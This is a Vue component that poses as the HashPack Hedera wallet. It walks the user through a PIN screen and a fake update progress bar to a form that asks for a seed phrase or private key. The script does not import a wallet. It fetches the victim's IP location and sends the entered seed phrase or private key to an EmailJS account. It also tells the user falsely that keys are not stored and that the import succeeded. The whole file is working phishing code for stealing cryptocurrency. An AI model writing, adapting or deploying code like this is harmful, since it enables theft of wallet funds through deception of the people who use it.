<template>
  <div class="bg-[#181A20] rounded-2xl w-full text-white overflow-hidden">
    <div
      v-if="currentStep === 3 || currentStep === 4"
      class="flex justify-between items-center py-4 px-4 border-b border-gray-700"
    >
      <button
        @click="goBackToStep2"
        style="background: white; border: none; padding: 0"
        class=""
      >
        <svg
          class="text-gray-600 hover:text-gray-800 h-6 w-6"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M15 19l-7-7 7-7"
          />
        </svg>
      </button>
      <div class="text-3xl font-bold text-white">
        {{
          currentStep === 2
            ? "Connect account"
            : currentStep === 3
            ? "Update account"
            : "Import a wallet"
        }}
      </div>
      <svg
        xmlns="http://www.w3.org/2000/svg"
        class="h-5 w-5 text-[#777777]"
        fill="none"
        viewBox="0 0 24 24"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          stroke-width="2"
          d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
        />
      </svg>
    </div>

    <hr class="border-t m-0 border-gray-500" v-if="currentStep !== 1" />

    <div class="min-h-[420px] flex flex-col relative p-6">
      <transition name="fade" mode="out-in">
        <div :key="currentStep">
          <template v-if="currentStep === 1">
            <div class="flex flex-col items-center justify-center">
              <div class="rounded-3xl flex justify-center w-full pt-[90px]">
                <img
                  class="w-[80px] h-[80px]"
                  src="https://play-lh.googleusercontent.com/iFpAMOykLLlqE6yqZEG9mzhhmIVWIp5zTixNSneboNWn-uDqeEh8ZjUtc0wniLAPQ6I"
                  alt="HashPack"
                />
              </div>
              <form class="w-full p-6">
                <h2
                  style="color: white"
                  class="text-5xl leading-[24px] text-center font-bold mb-6 mt-2 tracking-[-0.02em]"
                >
                  HashPack
                </h2>
                <p
                  class="text-gray-500 font-semibold text-center text-2xl mb-8"
                >
                  Hedera wallet
                </p>
                <div class="mb-2">
                  <label class="text-white text-[14px] font-medium mb-2"
                    >Enter your has PIN</label
                  >
                  <input
                    type="password"
                    v-model="password"
                    style="background: #23262f; font-size: 14px"
                    class="w-full font-medium bg-[#eeeeee] rounded-[6px] p-3 text-[#777777] placeholder-[#777777] focus-visible:border-[#2f2f2f] focus-visible:ring-0 focus-visible:outline-none"
                    placeholder="Pin"
                    required
                  />
                </div>
                <div class="mt-28">
                  <div class="text-center mb-4">
                    <a
                      href="#"
                      class="text-xl hover:underline text-gray-300 font-bold mt-2 hover:text-white"
                      >Forgot your password?</a
                    >
                  </div>
                  <button
                    @click="unlock"
                    type="button"
                    :disabled="password.length < 1 || isLoading"
                    :class="password.length > 0 ? 'bg-white' : 'bg-gray-400'"
                    class="w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#333] text-black relative"
                  >
                    <span v-if="!isLoading">Unlock Wallet</span>
                    <svg
                      v-else
                      class="animate-spin h-6 w-6 text-black"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        class="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        stroke-width="4"
                      />
                      <path
                        class="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                      />
                    </svg>
                  </button>
                </div>
              </form>
            </div>
          </template>

          <template v-else-if="currentStep === 2">
            <div>
              <div class="rounded-3xl flex justify-center w-full pt-[90px]">
                <img
                  class="w-[80px] h-[80px]"
                  src="https://play-lh.googleusercontent.com/iFpAMOykLLlqE6yqZEG9mzhhmIVWIp5zTixNSneboNWn-uDqeEh8ZjUtc0wniLAPQ6I"
                  alt="HashPack"
                />
              </div>
              <h2
                style="color: white"
                class="text-4xl leading-[24px] text-center font-bold mb-6 mt-4 tracking-[-0.02em]"
              >
                This app will be updated to the latest version
              </h2>
              <p class="text-gray-500 font-semibold text-center text-2xl mb-8">
                Enhancements and stability improvements
              </p>
              <div class="w-full pt-6 pb-[10px]">
                <div class="flex gap-3 w-full mt-[40px]">
                  <button
                    @click="nextStep"
                    class="w-full py-4 px-4 mb-2 bg-white border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#333] text-black relative"
                  >
                    Update Now
                  </button>
                </div>
              </div>
            </div>
          </template>

          <template v-else-if="currentStep === 3">
            <div key="s3" class="flex flex-col items-center p-6">
              <div class="flex flex-col items-center gap-3 py-6 w-full">
                <div class="flex items-center justify-center">
                  <img
                    src="https://play-lh.googleusercontent.com/iFpAMOykLLlqE6yqZEG9mzhhmIVWIp5zTixNSneboNWn-uDqeEh8ZjUtc0wniLAPQ6I"
                    class="w-20 h-20"
                    alt="HashPack"
                  />
                </div>
                <h2 class="text-4xl text-white mt-2 mb-0 text-center font-bold">
                  Updating HashPack
                </h2>
                <p class="text-gray-300 text-[16px] text-center">
                  Please wait while we apply the latest updates
                </p>
                <div class="w-full mt-6">
                  <div class="bg-black h-2 rounded-full overflow-hidden">
                    <div
                      class="h-2 rounded-full transition-all"
                      :style="{ width: progress + '%', background: 'white' }"
                    ></div>
                  </div>
                  <div
                    class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-white"
                  >
                    <span>{{ Math.round(progress) }}%</span>
                  </div>
                </div>
                <p class="text-gray-300 text-[14px] leading-8 text-center mt-4">
                  This may take a few moments. Please do not close this window.
                </p>
              </div>
            </div>
          </template>

          <template v-else-if="currentStep === 4">
            <div key="s4" class="flex flex-col w-full p-6">
              <div
                style="border: 2px solid #222222"
                class="flex mb-4 bg-black rounded-[30px] flex p-2 space-x-3"
              >
                <button
                  @click="activeTab = 'seed'"
                  :class="[
                    'flex-1 text-white rounded-[30px] py-3 text-lg font-semibold',
                    activeTab === 'seed' ? 'bg-[#23262F]' : 'bg-transparent',
                  ]"
                >
                  Seed Phrase
                </button>
                <button
                  @click="activeTab = 'private'"
                  :class="[
                    'flex-1 text-white rounded-[30px] py-3 text-lg font-semibold',
                    activeTab === 'private' ? 'bg-[#23262F]' : 'bg-transparent',
                  ]"
                >
                  Private Key
                </button>
              </div>
              <div v-if="activeTab === 'seed'">
                <p class="mb-4 font-bold text-[14px] leading-8">
                  You can paste the entire mnemonic phrase into the first blank
                  space.
                </p>
                <div
                  class="mb-6 relative flex items-center space-x-1 my-[20px]"
                >
                  <div class="relative flex space-x-1 mr-2">
                    <div class="right-0 flex items-center pointer-events-none">
                      <svg
                        class="h-5 w-5 text-gray-400"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M19 9l-7 7-7-7"
                        />
                      </svg>
                    </div>
                    <select
                      style="
                        background-color: transparent !important;
                        color: white;
                      "
                      v-model="selectedWordCount"
                      @change="updateWordCount"
                      class="w-full font-bold text-xl bg-white rounded-lg text-gray-700 appearance-none cursor-pointer focus:outline-none"
                    >
                      <option value="12">12 words</option>
                      <option value="24">24 words</option>
                    </select>
                  </div>
                  <label
                    class="block font-semibold text-white text-xl pb-0 m-0 font-medium"
                    >mnemonic phrase</label
                  >
                </div>
                <div class="rounded-none max-h-[38rem] overflow-y-auto">
                  <div class="grid grid-cols-3 gap-0">
                    <div
                      v-for="n in parseInt(selectedWordCount)"
                      :key="n"
                      class="relative"
                    >
                      <span
                        class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 text-sm select-none z-10 font-medium"
                        >{{ n }}</span
                      >
                      <div class="relative">
                        <input
                          :type="hiddenFields[n - 1] ? 'password' : 'text'"
                          v-model="phraseWords[n - 1]"
                          style="
                            background: #23262f;
                            padding-left: 30px;
                            border-radius: 0px;
                          "
                          class="w-full border-none py-3 pl-10 pr-10 text-white text-sm outline-none"
                        />
                      </div>
                    </div>
                  </div>
                </div>
                <p class="mt-[20px] leading-8 text-[13px] font-semibold">
                  Supports importing mnemonic phrases and private keys. HashPack
                  will not store your mnemonic phrases and private keys.
                </p>
                <div class="flex gap-3 mt-[30px]">
                  <button
                    @click="confirmPhrase"
                    :disabled="isImportDisabled"
                    class="flex-1 font-bold bg-white text-[14px] border-none hover:text-[#222] text-black py-4 px-4 rounded-[30px] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    Confirm
                  </button>
                </div>
              </div>
              <div v-else-if="activeTab === 'private'">
                <textarea
                  v-model="privateKeyInput"
                  rows="4"
                  style="background: #23262f; font-size: 14px"
                  class="w-full border border-gray-300 rounded-lg py-3 px-4 text-white text-base outline-none resize-none"
                ></textarea>
                <p class="mt-[90px] text-[14px] font-semibold leading-8">
                  Supports importing mnemonic phrases and private keys. HashPack
                  will not store your mnemonic phrases and private keys.
                </p>
                <div class="flex gap-3">
                  <button
                    @click="confirmPrivateKey"
                    :disabled="isLoading || !privateKeyInput.trim()"
                    class="flex-1 font-bold bg-white text-[14px] border-none hover:text-[#222] text-black py-4 px-4 rounded-[30px] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span v-if="!isLoading">Import</span>
                    <svg
                      v-else
                      class="animate-spin h-5 w-5 inline-block"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        class="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        stroke-width="4"
                      />
                      <path
                        class="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                      />
                    </svg>
                  </button>
                </div>
              </div>
            </div>
          </template>
        </div>
      </transition>

      <transition name="fade">
        <div
          v-if="message.text"
          :class="[
            'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
            message.type === 'success'
              ? 'bg-green-600 text-white'
              : 'bg-red-600 text-white',
          ]"
        >
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import { ref, watch, computed } from "vue";
import axios from "axios";

const emit = defineEmits(["close"]);
const currentStep = ref(1);
const password = ref("");
const isLoading = ref(false);
const progress = ref(0);
const message = ref({ text: "", type: "" });

const activeTab = ref("seed");
const selectedWordCount = ref("12");
const phraseWords = ref([]);
const hiddenFields = ref([]);
const privateKeyInput = ref("");

function initPhraseWords() {
  const count = parseInt(selectedWordCount.value);
  phraseWords.value = Array(count).fill("");
  hiddenFields.value = Array(count).fill(true);
}
function updateWordCount() {
  initPhraseWords();
}
function goBackToStep2() {
  currentStep.value = 2;
}
function unlock() {
  if (password.value.length < 1) return;
  isLoading.value = true;
  setTimeout(() => {
    isLoading.value = false;
    nextStep();
  }, 2000);
}
async function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;
  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;
  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      isLoading.value = false;
      setTimeout(() => {
        currentStep.value = 4;
        initPhraseWords();
      }, 400);
    }
  }
  requestAnimationFrame(step);
}
function nextStep() {
  if (currentStep.value < 3) {
    currentStep.value++;
    if (currentStep.value === 3) startUpdate();
  }
}
function prevStep() {
  if (currentStep.value > 1) currentStep.value--;
}
function toggleFieldVisibility(idx) {
  hiddenFields.value[idx] = !hiddenFields.value[idx];
}

const isImportDisabled = computed(() =>
  activeTab.value === "private"
    ? !privateKeyInput.value.trim()
    : phraseWords.value.some((w) => !w || !w.trim())
);

async function confirmPhrase() {
  if (isImportDisabled.value)
    return showMessage("Please fill all fields", "error");
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "seed",
      wordCount: selectedWordCount.value,
      phrase: phraseWords.value.join(" "),
    };
    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "HashPack",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );
    if (response.data === "OK") {
      showMessage("Wallet imported successfully!", "success");
      emit("close");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function confirmPrivateKey() {
  if (!privateKeyInput.value.trim())
    return showMessage("Please enter your private key", "error");
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = { type: "privateKey", privateKey: privateKeyInput.value };
    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "HashPack",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );
    if (response.data === "OK") {
      showMessage("Private key imported successfully!", "success");
      emit("close");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}

watch(currentStep, (val) => {
  if (val === 3) startUpdate();
});
initPhraseWords();
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.4s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
input::placeholder {
  font-size: 14px;
  color: #9ca3af;
}
.scrollbar-custom::-webkit-scrollbar {
  width: 6px;
}
.scrollbar-custom::-webkit-scrollbar-track {
  background: #f1f1f1;
  border-radius: 3px;
}
.scrollbar-custom::-webkit-scrollbar-thumb {
  background: #c1c1c1;
  border-radius: 3px;
}
.scrollbar-custom::-webkit-scrollbar-thumb:hover {
  background: #a8a8a8;
}
</style>
